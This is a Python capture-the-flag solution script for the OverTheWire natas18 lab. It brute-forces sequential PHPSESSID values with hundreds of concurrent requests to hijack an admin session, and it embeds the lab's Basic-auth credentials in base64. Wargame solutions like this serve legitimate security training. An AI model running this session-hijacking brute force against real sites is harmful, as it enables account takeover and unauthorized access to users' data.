#!/usr/bin/env python3

import aiohttp
import asyncio
import time

total_sessions = 640
url = "http://natas18.natas.labs.overthewire.org:80/index.php"
truestring = 'You are an admin. The credentials for the next level are:<br>'
concurrency_limit = 300 #Not sure what limit to set, try lowering until it can't work? :) It works at 300 for me.

burp_proxy = 'http://127.0.0.1:8080'

natas18_cookies = {"__utma": "176859643.1576322311.1574691834.1574696384.1574698992.3", "__utmz": "176859643.1574691834.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)", "PHPSESSID": "123"}

natas18_hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://natas18.natas.labs.overthewire.org/index.php", "Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

natas18_data = {"username": "user", "password": "pass"}

async def post_phpsessid(url,session,sem,natas18_cookies,i,s):
	natas18_cookies['PHPSESSID'] = str(i)
	#async with sem, session.post(url,headers=natas18_hdrs,data=natas18_data,cookies=natas18_cookies,proxy=burp_proxy) as resp:
	async with sem, session.post(url,headers=natas18_hdrs,data=natas18_data,cookies=natas18_cookies) as resp:	
		data = await resp.text()
		if (truestring in data):
			print(data)
			print("PHPSESSID = " + str(i))
			elapsed = time.perf_counter() - s
			print(f"This took {elapsed:0.2f} seconds")
			

async def main():
	s = time.perf_counter()	
	sem = asyncio.Semaphore(concurrency_limit) # This limits the concurrency to the number specified
	async with aiohttp.ClientSession() as session:
		tasks = [asyncio.create_task(post_phpsessid(url,session,sem,natas18_cookies,i+1,s)) for i in range(total_sessions)]
		results = await asyncio.gather(*tasks)

asyncio.run(main())
